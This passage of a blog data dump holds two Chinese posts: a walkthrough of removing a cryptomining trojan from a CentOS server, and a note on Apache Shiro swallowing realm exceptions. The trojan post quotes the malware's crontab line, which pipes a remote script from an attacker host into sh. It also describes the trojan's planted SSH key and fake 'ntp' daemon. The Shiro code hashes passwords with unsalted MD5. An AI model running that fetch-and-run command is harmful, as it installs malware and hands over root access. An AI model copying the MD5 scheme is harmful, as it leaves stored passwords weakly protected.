id=\"&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\"><a href=\"#&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\" class=\"headerlink\" title=\"&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;\"></a>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</h2><p>1&#x3001;&#x901A;&#x5E38;&#x76F4;&#x63A5;kill&#x6389;&#x8FDB;&#x7A0B;&#xFF0C;&#x662F;&#x4E0D;&#x597D;&#x4F7F;&#x7684;&#xFF0C;&#x80AF;&#x5B9A;&#x6709;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x8FD8;&#x6709;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x6E05;&#x7406;&#x6B65;&#x9AA4;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;<br>2&#xFF09;&#x5E72;&#x6389;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;<br>3&#xFF09;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;</p>\n<p>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E76;&#x5E72;&#x6389;</p>\n<p>&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x6709;&#x5927;&#x6982;&#x6709;&#x4E24;&#x79CD;&#x5B58;&#x5728;&#x5F62;&#x5F0F;&#xFF0C;crontab &#x548C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#x5F97;&#x6162;&#x6162;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;crontab&#xFF0C;&#x6709;&#x4E00;&#x6761;&#x4E0D;&#x662F;&#x6211;&#x521B;&#x5EFA;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4EFB;&#x52A1;&#x662F;&#xFF1A;&#x76F4;&#x63A5;&#x4ECE;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;&#x811A;&#x672C;pm.sh &#x5E76;&#x6267;&#x884C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/5.jpg\" alt=\"5.jpg\"></p>\n<p>2&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x811A;&#x672C;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/6.jpg\" alt=\"6.jpg\"></p>\n<p>3&#x3001;&#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x628A; <em>/10 </em> <em> </em> * curl -fsSL <a href=\"http://r.chanstring.com/pm.sh?0706\">http://r.chanstring.com/pm.sh?0706</a> | sh &#x5199;&#x5165;crontab<br>2&#xFF09;&#x628A;authorized_keys&#x5220;&#x6389;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x514D;&#x767B;&#x5F55;&#x6587;&#x4EF6;/root/.ssh/KHK75NEOiq&#xFF0C;&#x4FEE;&#x6539;ssh&#x914D;&#x7F6E;&#x91CD;&#x542F;<br>3&#xFF09;curl&#x4E0B;&#x8F7D;/opt/KHK75NEOiq33 &#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5;&#xFF08;/opt/KHK75NEOiq33 &#x2013;Install&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;ntp</p>\n<p>4&#x3001;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x8FD9;&#x4E2A;ntp&#x5C31;&#x662F;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x4F46;&#x770B;&#x5230;ntp&#x771F;&#x7684;&#x6709;&#x4E9B;&#x6015;&#x6015;&#xFF0C;ntp&#x4E0D;&#x662F;&#x641E;&#x65F6;&#x95F4;&#x540C;&#x6B65;&#x7684;&#x5417;&#xFF0C;&#x5176;&#x5B9E; Linux&#x6B63;&#x5E38;&#x7684;ntp&#x670D;&#x52A1;&#x53EB;ntpd&#xFF0C;&#x5E76;&#x975E;ntp&#xFF0C;&#x5F88;&#x6709;&#x8FF7;&#x60D1;&#x6027;&#x554A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/7.jpg\" alt=\"7.jpg\"></p>\n<p>5&#x3001;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x81EA;&#x5DF1;&#x653E;&#x5FC3;&#xFF0C;&#x8FD8;&#x662F;&#x6821;&#x9A8C;&#x4E86;&#x4E00;&#x756A;<br>&#x6211;&#x4EEC;&#x5148;&#x4ECE;&#x65F6;&#x95F4;&#x4E0A;&#x6821;&#x9A8C;&#xFF0C;ntp&#x662F;&#x4E0D;&#x662F;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x540E;&#x521B;&#x5EFA;&#x7684;</p>\n<p>&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;<br>&#x53BB;/var/log&#x4E0B;&#x770B;cron&#x7684;&#x65E5;&#x5FD7;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/8.jpg\" alt=\"8.jpg\"></p>\n<p>6&#x3001;Jul 24 09:23:01 &#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#xFF1A; curl -L <a href=\"http://r.chanstring.com/pm.sh?0703\">http://r.chanstring.com/pm.sh?0703</a><br>Jul 24 09:30:01 &#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x76EE;&#x524D;crontab&#x91CC;&#x7684;&#x4EFB;&#x52A1;&#xFF1A;curl -fsSL <a href=\"http://r.chanstring.com/pm.sh?0706\">http://r.chanstring.com/pm.sh?0706</a><br>Jul 24 09:49 &#x811A;&#x672C;/etc/init.d/ntp&#x7684;&#x521B;&#x5EFA;&#x65F6;&#x95F4;</p>\n<p>&#x4ECE;pm.sh&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x53EF;&#x77E5; curl&#x4E0B;&#x6765;/opt/KHK75NEOiq33&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5; /opt/KHK75NEOiq33 &#x2013;Install &#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5728;&#x6211;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x662F;10&#x591A;&#x5206;&#x949F;&#x3002;</p>\n<p>&#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x4E0A;&#x57FA;&#x672C;&#x543B;&#x5408;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/9.jpg\" alt=\"9.jpg\"></p>\n<p>7&#x3001;&#x6211;&#x4EEC;&#x770B;&#x4E00;&#x4E0B;ntp&#x7684;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;<br>runlevel 2 3 4 5&#x90FD;&#x542F;&#x52A8;&#x4E86;&#xFF0C;&#x591F;&#x72E0;&#x7684;&#x5440;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/10.jpg\" alt=\"10.jpg\"></p>\n<p>8&#x3001;&#x770B;&#x4E00;&#x4E0B;&#x5E38;&#x7528;&#x7684;3&#x5427;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230; &#x6709;&#x4E2A;S50ntp &#x8F6F;&#x94FE;&#x4E86;&#x811A;&#x672C;/etc/init.d/ntp</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/11.jpg\" alt=\"11.jpg\"></p>\n<p>9&#x3001;&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x65E5;&#x5FD7;<br>vim /var/log/boot.log<br>&#x6709;&#x4E00;&#x6761;&#x662F;Staring S50ntp&#xFF0C;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x5BF9;&#x5E94;&#x811A;&#x672C;/etc/init.d/ntp &#x4E2D;&#x7684; echo &#x201C;Starting $name&#x201D;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/12.jpg\" alt=\"12.jpg\"></p>\n<p>10&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B; /etc/init.d/ntp &#x8FD9;&#x4E2A;&#x811A;&#x672C;<br>$name&#x5E94;&#x8BE5;&#x5C31;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x662F; S50ntp&#xFF0C;&#x901A;&#x8FC7;stdout_log,stderr_log,pid_file&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/13.jpg\" alt=\"13.jpg\"></p>\n<p>11&#x3001;&#x901A;&#x8FC7;&#x641C;&#x7D22;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#xFF08;/opt/KHK75NEOiq33&#xFF09;&#xFF0C;&#x53EF;&#x77E5;&#x770B;&#x5230; /opt/KHK75NEOiq33 &#x2013;Install&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5199;&#x5165;&#x4E86;ntp&#x811A;&#x672C; &#x81EA;&#x542F;&#x52A8; /opt/minerd&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/14.jpg\" alt=\"14.jpg\"></p>\n<p>12&#x3001;&#x6253;&#x5F00; /usr/local/etc/minerd.conf&#xFF0C;&#x5185;&#x5BB9;&#x5C31;&#x662F;/opt/minerd&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x540E;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/15.jpg\" alt=\"15.jpg\"></p>\n<p>13&#x3001;&#x597D;&#x4E86; &#x9A8C;&#x8BC1;&#x5B8C;&#x6BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5E72;&#x6389;&#x8FD9;&#x4E2A;ntp&#x4E86;</p>\n<hr>\n<h2 id=\"&#x6E05;&#x7406;&#x6728;&#x9A6C;\"><a href=\"#&#x6E05;&#x7406;&#x6728;&#x9A6C;\" class=\"headerlink\" title=\"&#x6E05;&#x7406;&#x6728;&#x9A6C;\"></a>&#x6E05;&#x7406;&#x6728;&#x9A6C;</h2><p>1&#x3001;&#x53BB;&#x6389;crontab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6709;&#x5173;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#xFF1A;<br>/var/spool/cron/crontabs/root<br>/var/spool/cron/root</p>\n<p>2&#x3001;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;ntp&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x76F8;&#x5173;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/16.jpg\" alt=\"16.jpg\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/17.jpg\" alt=\"17.jpg\"></p>\n<p>3&#x3001;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#x53CA;&#x5176;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/18.jpg\" alt=\"18.jpg\"></p>\n<p>4&#x3001;&#x5E72;&#x6389;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x53CA;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x7684;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/19.jpg\" alt=\"19.jpg\"></p>\n<p>5&#x3001;&#x5E72;&#x6389;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x7684;&#x6587;&#x4EF6;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/20.jpg\" alt=\"20.jpg\"></p>\n<p>6&#x3001;top&#x4E00;&#x4E0B; &#x4E00;&#x5207;&#x90FD;&#x6B63;&#x5E38;&#x4E86;&#xFF01;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/21.jpg\" alt=\"21.jpg\"></p>\n<p>7&#x3001;&#x91CD;&#x542F;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6CA1;&#x95EE;&#x9898;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%BD%BB%E5%BA%95%E6%B8%85%E9%99%A4Linux%20centos%20minerd%E6%9C%A8%E9%A9%AC/22.jpg\" alt=\"22.jpg\"></p>"},{"title":"外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常","date":"2016-09-19T14:41:19.000Z","toc":false,"_content":"\nshiro权限框架，用户登录方法的subject.login(token)会进入自定义的UserNamePasswordRealm类的doGetAuthenticationInfo身份验证方法\n\n通常情况，doGetAuthenticationInfo写法如下：\n\n```bash\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException {\n\tUsernamePasswordToken token = (UsernamePasswordToken) authcToken;\n\tUser loginUser = userService.getUserByName(token.getUsername());\n\tif (ObjectUtils.isEmpty(loginUser)) {\n\t\tthrow new UnknownAccountException();\n\t}\n\tif(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){\n\t\tthrow new IncorrectCredentialsException();\n\t}\n\t//其他各种验证\n\t。。。\n}\n\n```\n\nlogin登录方法：\n```bash\n@ResponseBody\n@RequestMapping(value = \"/login\", method = RequestMethod.POST)\npublic String doUserLogin(User user, HttpServletRequest request, Model model) {\n\t...\n\tSubject subject = SecurityUtils.getSubject();\n\tUsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord());\n\ttry {\n\t\tsubject.login(token);\n\t} catch (UnknownAccountException uae) {\n\t\t\n\t} catch (IncorrectCredentialsException ice) {\n\t\t\n\t} catch (LockedAccountException lae) {\n\t\t\n\t} catch (ExcessiveAttemptsException eae) {\n\t\t\n\t} catch (AuthenticationException ae) {\n\t\t\n\t}\n\t...\n}\n```\n\n---\n\n<font style=\"color:red\">可是最近一次项目，发现通用的方法行不通了，doGetAuthenticationInfo方法抛出的各种异常如UnknownAccountException(包括自定义的异常)，外部都无法准确捕捉。\n\n<!-- more -->\n\n外部login捕捉的异常统一被改写为 AuthenticationException异常(IncorrectCredentialsException等异常的父类)，且异常的msg内容也被改写。内容如下：</font>\n\n\n![图1](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/1.png)\n\n原因在subject.login(token)的源码里，源码有这么一段：\n\n![图2](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/2.png)\n\n我们进入doSingleRealmAuthentication方法，可以看见方法里面外抛了UnknownAccountException等异常。\n所以如果项目中只定义了一个realm，比如用来进行登录的身份验证，外部是可以正常捕捉的。\n\n![图3](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/3.png)\n\n<font style=\"color:red\">但是此次项目我定义了两个realm，一个用来进行登录的身份验证，另一个用来登录后，验证各种请求携带的的token。</font>\n我们进入doMultiRealmAuthentication方法，内容如下\n\n![图4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/4.png)\n\n再进入afterAllAttempts的实现类，如图5。\n发现抛出的异常都被统一改为AuthenticationException异常，且msg也被改写，正如图1所示。\n\n![图5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/5.png)\n\n\n### 结论\n\n外部无法捕捉doGetAuthenticationInfo方法抛出的异常，原因在于源码，而不是自己的代码有问题。\n如果没有改写源码的本事，那么外部想要捕捉各种异常，并在前端显示各种提示语，怎么办？\n\n我的临时解决方法是，doGetAuthenticationInfo只用来验证用户名和密码，\n外部直接捕捉AuthenticationException异常，其他的各种验证从doGetAuthenticationInfo方法移至login。","source":"_posts/外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常.md","raw":"---\ntitle: 外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常\ncategories:\n  - 错误集锦\ntags:\n  - shiro\ndate: 2016-9-19 22:41:19\ntoc: false\n---\n\nshiro权限框架，用户登录方法的subject.login(token)会进入自定义的UserNamePasswordRealm类的doGetAuthenticationInfo身份验证方法\n\n通常情况，doGetAuthenticationInfo写法如下：\n\n```bash\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException {\n\tUsernamePasswordToken token = (UsernamePasswordToken) authcToken;\n\tUser loginUser = userService.getUserByName(token.getUsername());\n\tif (ObjectUtils.isEmpty(loginUser)) {\n\t\tthrow new UnknownAccountException();\n\t}\n\tif(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){\n\t\tthrow new IncorrectCredentialsException();\n\t}\n\t//其他各种验证\n\t。。。\n}\n\n```\n\nlogin登录方法：\n```bash\n@ResponseBody\n@RequestMapping(value = \"/login\", method = RequestMethod.POST)\npublic String doUserLogin(User user, HttpServletRequest request, Model model) {\n\t...\n\tSubject subject = SecurityUtils.getSubject();\n\tUsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord());\n\ttry {\n\t\tsubject.login(token);\n\t} catch (UnknownAccountException uae) {\n\t\t\n\t} catch (IncorrectCredentialsException ice) {\n\t\t\n\t} catch (LockedAccountException lae) {\n\t\t\n\t} catch (ExcessiveAttemptsException eae) {\n\t\t\n\t} catch (AuthenticationException ae) {\n\t\t\n\t}\n\t...\n}\n```\n\n---\n\n<font style=\"color:red\">可是最近一次项目，发现通用的方法行不通了，doGetAuthenticationInfo方法抛出的各种异常如UnknownAccountException(包括自定义的异常)，外部都无法准确捕捉。\n\n<!-- more -->\n\n外部login捕捉的异常统一被改写为 AuthenticationException异常(IncorrectCredentialsException等异常的父类)，且异常的msg内容也被改写。内容如下：</font>\n\n\n![图1](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/1.png)\n\n原因在subject.login(token)的源码里，源码有这么一段：\n\n![图2](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/2.png)\n\n我们进入doSingleRealmAuthentication方法，可以看见方法里面外抛了UnknownAccountException等异常。\n所以如果项目中只定义了一个realm，比如用来进行登录的身份验证，外部是可以正常捕捉的。\n\n![图3](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/3.png)\n\n<font style=\"color:red\">但是此次项目我定义了两个realm，一个用来进行登录的身份验证，另一个用来登录后，验证各种请求携带的的token。</font>\n我们进入doMultiRealmAuthentication方法，内容如下\n\n![图4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/4.png)\n\n再进入afterAllAttempts的实现类，如图5。\n发现抛出的异常都被统一改为AuthenticationException异常，且msg也被改写，正如图1所示。\n\n![图5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/5.png)\n\n\n### 结论\n\n外部无法捕捉doGetAuthenticationInfo方法抛出的异常，原因在于源码，而不是自己的代码有问题。\n如果没有改写源码的本事，那么外部想要捕捉各种异常，并在前端显示各种提示语，怎么办？\n\n我的临时解决方法是，doGetAuthenticationInfo只用来验证用户名和密码，\n外部直接捕捉AuthenticationException异常，其他的各种验证从doGetAuthenticationInfo方法移至login。","slug":"外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常","published":1,"updated":"2016-11-17T11:59:42.680Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulej004ngwtmg4d9nqnz","content":"<p>shiro&#x6743;&#x9650;&#x6846;&#x67B6;&#xFF0C;&#x7528;&#x6237;&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#x7684;subject.login(token)&#x4F1A;&#x8FDB;&#x5165;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserNamePasswordRealm&#x7C7B;&#x7684;doGetAuthenticationInfo&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65B9;&#x6CD5;</p>\n<p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#xFF0C;doGetAuthenticationInfo&#x5199;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">protected AuthenticationInfo <span class=\"keyword\">do</span>GetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException {</span><br><span class=\"line\">\tUsernamePasswordToken token = (UsernamePasswordToken) authcToken;</span><br><span class=\"line\">\tUser loginUser = userService.getUserByName(token.getUsername());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ObjectUtils.isEmpty(loginUser)) {</span><br><span class=\"line\">\t\tthrow new UnknownAccountException();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){</span><br><span class=\"line\">\t\tthrow new IncorrectCredentialsException();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t//&#x5176;&#x4ED6;&#x5404;&#x79CD;&#x9A8C;&#x8BC1;</span><br><span class=\"line\">\t&#x3002;&#x3002;&#x3002;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>login&#x767B;&#x5F55;&#x65B9;&#x6CD5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/login&quot;</span>, method = RequestMethod.POST)</span><br><span class=\"line\">public String <span class=\"keyword\">do</span>UserLogin(User user, HttpServletRequest request, Model model) {</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tSubject subject = SecurityUtils.getSubject();</span><br><span class=\"line\">\tUsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord());</span><br><span class=\"line\">\ttry {</span><br><span class=\"line\">\t\tsubject.login(token);</span><br><span class=\"line\">\t} catch (UnknownAccountException uae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (IncorrectCredentialsException ice) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (LockedAccountException lae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (ExcessiveAttemptsException eae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t} catch (AuthenticationException ae) {</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t...</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<hr>\n<font 